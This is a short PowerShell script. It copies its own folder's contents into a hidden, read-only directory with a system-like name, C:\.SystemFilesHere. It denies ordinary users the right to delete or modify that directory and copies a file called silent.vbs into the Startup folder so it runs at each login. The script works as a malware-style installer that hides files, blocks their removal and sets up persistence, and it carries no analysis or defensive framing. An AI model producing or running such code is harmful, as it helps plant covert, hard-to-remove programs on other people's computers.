$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
$folderPath = "C:\.SystemFilesHere"

# Create the folder if it doesn't exist
if (-not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

$sourceDirectory = $scriptDirectory
$destinationDirectory = $folderPath

# Copy files from the source directory to the destination directory
Copy-Item -Path "$sourceDirectory\*" -Destination $destinationDirectory -Force



# Set folder permissions to deny delete and modify for all users
$acl = Get-Acl -Path $folderPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Users",
    "Delete,Modify",
    "ContainerInherit,ObjectInherit",
    "None",
    "Deny"
)
$acl.AddAccessRule($rule)
Set-Acl -Path $folderPath -AclObject $acl

# Set folder attributes to read-only and hidden
Set-ItemProperty -Path $folderPath -Name IsReadOnly -Value $true
Set-ItemProperty -Path $folderPath -Name Attributes -Value ([System.IO.FileAttributes]::ReadOnly -bor [System.IO.FileAttributes]::Hidden)

# copy file in startup folder vbs file here


$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
$sourceFile = Join-Path -Path $scriptDirectory -ChildPath "silent.vbs"
$destinationDirectory = [Environment]::GetFolderPath("Startup")

# Copy the file from the source directory to the Startup directory
Copy-Item -Path $sourceFile -Destination $destinationDirectory -Force
